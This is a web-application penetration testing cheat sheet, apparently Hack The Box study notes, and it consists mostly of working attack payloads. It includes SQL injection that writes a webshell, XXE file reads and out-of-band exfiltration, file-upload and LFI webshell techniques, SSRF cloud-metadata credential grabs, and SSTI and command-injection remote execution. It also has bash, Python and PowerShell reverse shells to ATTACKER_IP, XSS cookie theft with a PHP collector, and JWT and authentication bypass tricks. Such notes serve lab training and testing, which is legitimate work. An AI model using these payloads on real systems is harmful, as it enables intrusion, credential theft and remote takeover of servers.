#  HTB – Penetration Testing Notes for Web Apps

Author: James Saltmer  

---

## 1) Proxies And Burpsuite
### Match and Replace Rules Example (Proxy>Proxy settings>HTTP match and replace rules)
| Field | Value (Example) | Description |
|---|---|---|
|`Type`| `Request header` | Make a change in the request header (not the main body). |
| `Match` | `^User-Agent.*$` | Regex pattern captures the entire line which contains User-Agent |
| `Replace` | `User-Agent: Test Agent 1.0` | This will replace the line (Old agent) with the new agent (Test Agent 1.0) |
| `Regex match` | `True` | In this case the exact User-Agent string / name might not be known so use the regex to match and replace the specified pattern |

### Set a Burpsuite Proxy In metasploit Module:
```bash
set PROXIES HTTP:127.0.0.1:8080
```

## 2) Ffuf

### Getting Started
Help:
```bash
ffuf -h
```

Basic Directory Enum
```bash
#  | -w : Wordlist | -u : URL | -t : threads |
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ 
```

### Extensions
Fuzz for the Type of Extension Used:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
```

Fuzz for directories ending in specified exension (.PHP in this case):
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
```

### Reccursive Enumeration
Run ffuf with a recursion depth of 1 for directories with php extension:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```


### Subdomain Fuzzing
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
```

### VHost Fuzzing
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

### FFUF Filtering
Filter Out Responses Based on Size:
```bash
# Filter out responses with a size of 900
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
```

### Enumerate Parameters
Enumerate Get Params
```bash
# Change xxx to filter out responses
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

Enumerate Post params
```bash
# Change xxx to filter out responses
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

Enumerate Param Values
```bash
# Example wordlist Numbers (1-1000)
for i in $(seq 1 1000); do echo $i >> ids.txt; done

# Fuz the value of id parameter in the post body with numbers from 1-1000
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

## 3) Web Login Bruteforce

Bruteforce with POST request
```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^"
# Could aslo change to "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" to set fail condition
# Or "/login:user=^USER^&pass=^PASS^:S=302" for success condition on response codes
```

Bruteforce with GET request
```bash
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 127.0.0.1 http-get /
```

## 4) SQL Injection
### Basic Payload
```sql
admin' or '1'='1

admin' or '1'='1' --

admin' or '1'='1' -- -

')-- - or 1=1 -- -
```

### Union (MYSQL)
Detect Number of Columns
```sql
' order by 1-- -

cn' UNION select 1,2,3-- -
```

Injection
```sql
cn' UNION select 1,@@version,3,4-- -
```
Injection for 4 columns
```sql
UNION select username, 2, 3, 4 from passwords-- -
```

Enumerate Database Names
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Check Current Database
```sql
cn' UNION select 1,database(),2,3-- -
```

Enumerate Tables within a database (dev in this case)
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Enumerate Columns from table (credentials in this case)
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Query Data from Table
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Get Current DB User
```sql
cn' UNION SELECT 1, user(), 3, 4-- -

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Check Current User Privileges
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

-- Y Would mean the user has superuser privileges

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

-- Current user root privileges
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
Read a File
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

Write to a File requires:
1. User with FILE privilege enabled
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server

Check if secure_file_priv is empty
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Write PHP Shell to file
```sql
cn' union select 1,'<?=`$_GET[0]`?>',3,4 into outfile '/var/www/html/test.php'-- -
```

### SQL Map
Basic Command
```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```
`--technique=<TECH>`:
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

Top Tip:
1. In the browser Copy request as cURL
2. Past into bash
3. Replace curl command with sqlmap, and keep request

POST Requests
```bash
# Defaults to test all params
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

# Use * to denote specific param (uid in this case)
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

```
Raw Request File:
```bash
sqlmap -r req.txt
```

Specify Cookie:
```bash
# Same can be done for other headers: --host, --referer, and -A/--user-agent
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# Or parse as header
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

```
Specify Prefix or Suffix:
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
For example vulnerable code:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```
With Suffix and Prefix would result in:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

More Boundaries:
```bash
sqlmap -u www.example.com/?id=1 --risk=3 3 --level=5
```

## 5) XML External Entity (XXE) Injeciton
### Basic Explanation:
Imagine a web app accepts xml user input and reflects the user's email to the page as such
```xml
<? xml version="1.0" encoding="UTF-8"?>
	<root>
		<name>
			First
		</name>
		<tel>
		</tel>
		<email>
			test@xxe.com
		</email>
		<message>
			Test
		</message>
	</root>
```
Response:
```txt
Check your email test@xxe.com for further instructions
```

We can insert a malicious xxe payload to read files:
```xml
<? xml version="1.0" encoding="UTF-8"?>
	<! DOCTYPE email [
	<! ENTITY company SYSTEM "file:///etc/passwd">
	]>
	<root>
		<name>
			First
		</name>
		<tel>
		</tel>
		<email>
			&company;
		</email>
		<message>
			Test
		</message>
	</root>
```
Response:
```txt
Check your email root:x:0:0:root:/root:/bin/bash ... for further instructions
```

If there are issues with not seeing content, likely due to XML special chars escaping the xml. This can be solved using `php://filter/` with `convert.base64-encode`:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=target-file.php">
]>
```

You can also try wrapping it in CDATA if you expect special characters:
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email>
```

### Blind XXE
If the server does not output any fields we have control over we can check for errors. If errors are outputed, we can host a `.dtd` file to display the output of other files on error:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
```bash
python3 -m http.server 8000
```

And then submit the following payload:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

When Fully Blind:
`xxe.dtd`:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
`index.php`:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Start PHP:
```bash
php -S 0.0.0.0:8000
```
Payload to send:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

### RCE with XXE
RCE with XXE can be possible using `expect://<command>`. We can generate a  webshell:
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
And then attempt to use curl to download the webshell to the server, using `$IFS` to handle whitespace.
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

## 6) File Upload Bypasses

### Quick Checks
Things to identify first:

| Check | Why it matters |
|---|---|
| Allowed extensions | Determines bypass strategy |
| Upload path | Confirms if file is web-accessible |
| Rename behaviour | Need final filename to execute/access |
| Content-Type validation | Can often be changed in Burp |
| Magic byte validation | Need valid file header/polyglot |
| Server stack | PHP/ASP/JSP payload choice |

### Basic PHP Web Shells
```php
<?php system($_GET['cmd']); ?>
```
```php
<?=`$_GET[0]`?>
```

Usage:
```bash
curl 'http://target/uploads/shell.php?cmd=id'
curl 'http://target/uploads/shell.php?0=id'
```

### Extension Bypasses
Try these when `.php` is blocked:
```text
shell.php5
shell.phtml
shell.phar
shell.php.
shell.php%00.jpg
shell.php%20
shell.php%0a
shell.php/
shell.php;.jpg
shell.jpg.php
shell.PHP
```

Apache/PHP common executable extensions:
```text
.php
.php3
.php4
.php5
.phtml
.phar
```

ASP/ASPX/JSP targets:
```text
shell.asp
shell.aspx
shell.jsp
```

### Content-Type Bypass
Change in Burp:
```http
Content-Type: image/jpeg
```

Other useful types:
```text
image/png
image/gif
application/octet-stream
text/plain
```

### Magic Byte / Polyglot Bypass
Add image headers before PHP:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

Or append shell to real image:
```bash
cp image.jpg shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Double Extension With Weak Server Rules
```text
shell.php.jpg
shell.jpg.php
shell.phtml.jpg
```

If Apache is configured with multiple extension handling, `file.php.jpg` may still execute as PHP.

### Useful Upload Locations to Try
```text
/uploads/shell.php
/upload/shell.php
/files/shell.php
/images/shell.php
/assets/shell.php
/static/shell.php
/media/shell.php
```

### If Upload Is Stored but Not Executed
Try to combine with:

| Technique | Example |
|---|---|
| LFI include | `?page=uploads/shell.php` |
| Path traversal | `?file=../../uploads/shell.php` |
| Filename injection | filename as `../../../var/www/html/shell.php` |
| Image processing bugs | metadata or parser-based issues |

## 7) LFI / RFI / Path Traversal

### Parameters Worth Testing
```text
file=
path=
page=
template=
view=
include=
document=
download=
folder=
lang=
locale=
```

### Basic Linux Reads
```text
../../../../etc/passwd
../../../../../../etc/passwd
/etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

More bypasses:
```text
..%252f..%252f..%252fetc%252fpasswd          Double URL encoding
....\/....\/....\/etc/passwd                 Mixed separators
/var/www/html/../../../etc/passwd            App requires a fixed path prefix
../../../../etc/passwd%00.pdf                Null byte (PHP < 5.3.4) when an extension is appended
../../../../etc/passwd%00
```

curl normalises `../` before sending — use `--path-as-is` (or Burp Repeater):
```bash
curl -s --path-as-is "http://SERVER_IP:PORT/download?file=../../../../etc/hostname"
curl -s -G "http://SERVER_IP:PORT/download" --data-urlencode "file=../../../../etc/hostname"
```

Useful Linux files:
```text
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/var/www/html/index.php
/var/www/html/config.php
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### Basic Windows Reads
```text
..\..\..\..\windows\win.ini
../../../../windows/win.ini
C:\Windows\win.ini
C:/Windows/System32/drivers/etc/hosts
```

Useful Windows files:
```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\Users\<USER>\Desktop\user.txt
```

### PHP Wrappers
Read source as base64:
```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

Decode:
```bash
echo '<BASE64>' | base64 -d
```

Other wrappers to test:
```text
php://input
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
zip://shell.zip%23shell.php
phar://shell.phar
```

### Log Poisoning to RCE
Poison User-Agent:
```http
User-Agent: <?php system($_GET['cmd']); ?>
```

Include access log:
```text
?page=../../../../var/log/apache2/access.log&cmd=id
?page=../../../../var/log/nginx/access.log&cmd=id
```

Other poisonable files:
```text
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/proc/self/environ
```

### RFI Quick Check
Requires remote includes or equivalent risky behaviour.
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 8000
```

Payload:
```text
?page=http://ATTACKER_IP:8000/shell.txt&cmd=id
```

## 8) SSRF

### Quick Test URLs
Use your listener first:
```bash
sudo tcpdump -ni tun0 port 80
python3 -m http.server 80
```

Payloads:
```text
http://ATTACKER_IP/
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
```

### Internal Service Targets
```text
http://127.0.0.1:80/
http://127.0.0.1:5000/
http://127.0.0.1:8000/
http://127.0.0.1:8080/
http://127.0.0.1:9000/
http://localhost:3000/
```

Internal host discovery:
```text
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1/
```

### Cloud Metadata
AWS:
```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

AWS IMDSv2 requires a token, but IMDSv1 may still work:
```bash
curl http://169.254.169.254/latest/meta-data/
```

Azure:
```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

GCP:
```text
http://metadata.google.internal/computeMetadata/v1/
```

### Bypass Tricks
```text
http://127.1/
http://2130706433/
http://0177.0.0.1/
http://0x7f.0x00.0x00.0x01/
http://localhost@evil.com/
http://evil.com@127.0.0.1/
http://127.0.0.1.nip.io/
```

URL encoding:
```text
http://127.0.0.1%2f
http://127.0.0.1%252f
```

### SSRF Port Scan With ffuf
```bash
seq 1 10000 > ports.txt
ffuf -w ports.txt:FUZZ -u 'http://target/fetch?url=http://127.0.0.1:FUZZ/' -fs <BASELINE_SIZE>
```

### SSRF to Redis Quick Win
If `gopher://` is supported, Redis on localhost can sometimes write files or cron jobs.
Test first:
```text
gopher://127.0.0.1:6379/_
```

Often blocked, but worth remembering when SSRF supports non-HTTP schemes.

## 9) SSTI

### Detection Payloads
Generic:
```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
```

If output is `49`, identify the engine.

### Jinja2 / Flask
Detection:
```text
{{7*7}}
{{config}}
{{self}}
```

Read files:
```text
{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}
```

RCE:
```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Alternative:
```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Reverse shell:
```text
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

### Twig / Symfony
Detection:
```text
{{7*7}}
{{_self}}
```

RCE attempts:
```text
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
```

### Freemarker
Detection:
```text
${7*7}
```

RCE:
```text
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

### Velocity
Detection:
```text
#set($x=7*7)$x
```

### ERB / Ruby
Detection:
```text
<%= 7*7 %>
```

RCE:
```text
<%= system('id') %>
<%= `id` %>
```

## 10) Command Injection

### Basic Separators
```text
;id
&& id
|| id
| id
`id`
$(id)
%0aid
%0did
```

Windows:
```text
& whoami
&& whoami
| whoami
%0a whoami
```

### Blind Command Injection
Time delay:
```text
;sleep 5
&& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
```

Windows delay:
```text
& timeout /T 5
& ping -n 6 127.0.0.1
```

Out-of-band:
```text
;curl http://ATTACKER_IP/$(whoami)
;wget http://ATTACKER_IP/$(hostname)
;nslookup $(whoami).ATTACKER_DOMAIN
```

Listener:
```bash
python3 -m http.server 80
sudo tcpdump -ni tun0 icmp or port 53 or port 80
```

### Whitespace Bypasses
```text
${IFS}
$IFS$9
%09
%0a
<
```

Examples:
```text
;cat${IFS}/etc/passwd
;cat</etc/passwd
;bash${IFS}-c${IFS}'id'
```

### Character Bypasses
If `/` is blocked:
```bash
echo ${PATH:0:1}
```

Payload:
```text
;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

If spaces and slashes are blocked, try base64:
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -w0
```

Payload:
```text
;echo${IFS}<BASE64>|base64${IFS}-d|bash
```

### Reverse Shells
Listener:
```bash
nc -lvnp 4444
```

Bash:
```text
;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

URL-encoded bash:
```text
%3bbash%20-c%20%27bash%20-i%20%3e%26%20/dev/tcp/ATTACKER_IP/4444%200%3e%261%27
```

Python:
```text
;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

Windows PowerShell:
```powershell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

### Common Injection Points
```text
host=
ip=
domain=
url=
cmd=
command=
exec=
ping=
debug=
file=
path=
```

## 11) Cross-Site Scripting
PAyloadsAllTheThings: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection`

Basic Payload (POC)
```html
<script>alert(document.cookie)</script>
```

Payload where `<script>` tags are not allowed
```html
<img src="" onerror=alert(document.cookie)>
```

Find which parameter reflects (inject a unique marker into every param, then grep the response):
```bash
curl -s "http://SERVER_IP:PORT/search?q=xssmark1&category=xssmark2&sort=xssmark3" | grep -n xssmark
```
Hidden params can be found with the ffuf parameter fuzzing in section 2. View source around the marker to see the context.

Payloads by reflection context:
```text
Between tags          <script>alert(1)</script>   <svg onload=alert(1)>
Inside attribute ""   "><script>alert(1)</script>   " autofocus onfocus=alert(1) x="
Inside attribute ''   '><svg onload=alert(1)>
Inside <textarea>     </textarea><script>alert(1)</script>
Inside <title>        </title><script>alert(1)</script>
Inside JS string ''   ';alert(1);//      '-alert(1)-'
Inside JS string ""   ";alert(1);//
Inside href / src     javascript:alert(1)
Filter bypasses       <ScRiPt>alert(1)</sCrIpT>   <scr<script>ipt>alert(1)</script>   <body onload=alert(1)>
```

Confirm reflection unencoded from the CLI:
```bash
curl -s -G "http://SERVER_IP:PORT/search" --data-urlencode 'q=<script>alert(1)</script>' | grep -F '<script>alert(1)</script>'
```
If the response contains `&lt;script&gt;` it is encoded (not vulnerable in that context). Prove execution in a browser — the alert box must pop.

XSS Discovery with `XSS Strike`
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

Load Remote JS
```html
<script src="http://OUR_IP/script.js"></script>
```

Steal Cookies
```html
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
PHP Server to Save Cookies
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## 12) Information Disclosure
Headers and fingerprinting:
```bash
curl -sI http://SERVER_IP:PORT/
whatweb -a 3 http://SERVER_IP:PORT/
nikto -h http://SERVER_IP:PORT/
```

Headers that leak versions:
```text
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3 | Express | ASP.NET | Next.js
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2
Server: Werkzeug/2.0.1 Python/3.8.10      (Flask)
X-Generator: Drupal 8
```

Trigger error pages / stack traces:
```text
/doesnotexist12345                 404 page often shows framework + version
?id='                              SQL / framework error
?id[]=1                            Type error in PHP / Rails
?id=%00   or a very long value
Unsupported method (e.g. PUT, TRACE)
```

Diagnostic / debug endpoints:
```text
/phpinfo.php  /info.php  /test.php               PHP version, modules, paths, env
/server-status  /server-info                     Apache mod_status / mod_info
/.env  /.git/HEAD  /composer.json  /package.json Secrets and dependency versions
/actuator  /actuator/env  /actuator/info         Spring Boot
/console                                         Werkzeug debugger (Flask) → RCE if unlocked
/elmah.axd  /trace.axd                           ASP.NET
/_profiler  /app_dev.php                         Symfony
/debug  /debug/vars  /status  /health  /metrics  /swagger  /api-docs
```

Framework tells in debug pages:
```text
Django DEBUG=True          Yellow error page listing "Django Version: x.y"
Laravel                    Ignition / Whoops page, "Laravel vX" in footer
Spring Boot                "Whitelabel Error Page"
ASP.NET                    Yellow screen: "Version Information: ... ASP.NET Version: x"
Rails                      "Action Controller: Exception caught" + Rails version
```

```bash
ffuf -u http://SERVER_IP:PORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc 200,301,302,403
```

## 13) Cookie and Session Security
Capture `Set-Cookie` after logging in:
```bash
curl -si -X POST http://SERVER_IP:PORT/login -d 'username=USER&password=PASS' | grep -i '^set-cookie'
```

Browser: DevTools → Application/Storage → Cookies shows HttpOnly / Secure / SameSite columns. Burp: check the login response headers.

| Attribute | Protects against | Missing means |
|---|---|---|
| `Secure` | Cookie sent over cleartext HTTP | Session can be sniffed over HTTP |
| `HttpOnly` | JavaScript reading the cookie | XSS can steal `document.cookie` |
| `SameSite=Lax/Strict` | Cross-site requests carrying the cookie | CSRF easier |
| `Expires` / `Max-Age` | Long-lived sessions | Session cookie (dies with browser) — usually fine |
| `Domain` / `Path` | Over-broad scope | Sent to sibling subdomains / paths |

Example:
```text
Set-Cookie: PHPSESSID=8f2c...; path=/
  -> Missing: Secure, HttpOnly, SameSite
Set-Cookie: session=abc; Path=/; HttpOnly
  -> Missing: Secure, SameSite
```
Note: `SameSite=None` is only honoured with `Secure`. Check every `Set-Cookie` header, not just the first.

Other session checks:
```text
Session ID unchanged after login          Session fixation
Decodable / sequential session ID         echo 'COOKIE' | base64 -d ; compare two sessions
Session still valid after logout          Replay old cookie with curl
Session ID in URL                         Leaks via Referer / logs
```

## 14) Authentication Bypass
Work through in order:

1. SQLi in login (see section 4):
```text
admin'-- -
admin' #
' OR 1=1-- -
' OR '1'='1' LIMIT 1-- -
") OR ("1"="1
admin')-- -
```

2. Default / weak creds: `admin:admin`, `admin:password`, `admin:admin123`, `root:root`, `test:test`, product defaults (search "<product> default password"). Brute with hydra (section 3).

3. Forced browsing / Execution After Redirect — `curl` does not follow redirects, so the protected page body may leak:
```bash
curl -si http://SERVER_IP:PORT/admin/dashboard.php
curl -si http://SERVER_IP:PORT/admin/
```

4. Cookie / parameter tampering:
```text
Cookie: admin=0 -> admin=1      role=user -> role=admin      isAdmin=false -> true
Hidden form field: <input type="hidden" name="role" value="user">
Base64 / URL-encoded cookie:  echo 'dXNlcj1ndWVzdA==' | base64 -d   ->  user=guest  ->  re-encode user=admin
```
```bash
curl -si http://SERVER_IP:PORT/dashboard -H 'Cookie: role=admin'
```

5. Response manipulation (client-side checks): in Burp intercept the login response and change `{"success":false}` → `true`, or `401`/`302 /login` → `200`. Also read the page JavaScript for hardcoded credentials or client-side-only checks.

6. Type juggling / NoSQL:
```text
username=admin&password[]=x                          PHP strcmp() returns NULL == 0
{"username":"admin","password":{"$ne":null}}         MongoDB
username=admin&password[$ne]=x
{"username":"admin","password":true}                 Loose comparison
```

7. JWT:
```bash
echo 'TOKEN' | cut -d. -f2 | base64 -d 2>/dev/null     # Inspect claims (add = padding if needed)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt         # Crack weak HS256 secret
jwt_tool TOKEN -X a                                               # alg:none attack
jwt_tool TOKEN -T                                                 # Tamper claims (e.g. "role":"admin")
```

8. Header / verb tricks:
```text
X-Forwarded-For: 127.0.0.1          IP allow-listed admin panels
X-Original-URL: /admin              Front-end path filtering
HEAD / PUT / POST instead of GET    Basic auth only applied to GET
/ADMIN  /admin/.  //admin  /admin;/  /%61dmin   Path normalisation
```

9. Password reset / registration logic: token returned in response, predictable token, `username` / `email` parameter changeable in the reset request, register `admin ` (trailing space) or `Admin`.

## 15) IDOR
```text
/profile?id=1001 -> 1000, 1          /api/users/5 -> /api/users/1
/download?file=invoice_1001.pdf      /orders/1001
Encoded IDs: base64(id), md5(id), UUIDs leaked elsewhere in the app
```
```bash
ffuf -u 'http://SERVER_IP:PORT/api/users/FUZZ' -w <(seq 1 1000) -H 'Cookie: session=VALUE' -fs SIZE
echo -n 1 | md5sum                    # Generate hashed IDs
```
Test with two accounts: request user B's object with user A's session. Also try changing `user_id` in POST/PUT bodies and switching GET to PUT/DELETE.

## 16) CSRF
Vulnerable when a state-changing request has no unpredictable token and the cookie lacks `SameSite`.

Checks:
```text
Remove the csrf_token parameter        Still accepted?
Use another user's token / blank token Still accepted?
Change POST to GET                     Still accepted?
```

PoC:
```html
<html><body>
<form action="http://SERVER_IP:PORT/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.test">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```
Burp Pro: right-click request → Engagement tools → Generate CSRF PoC.
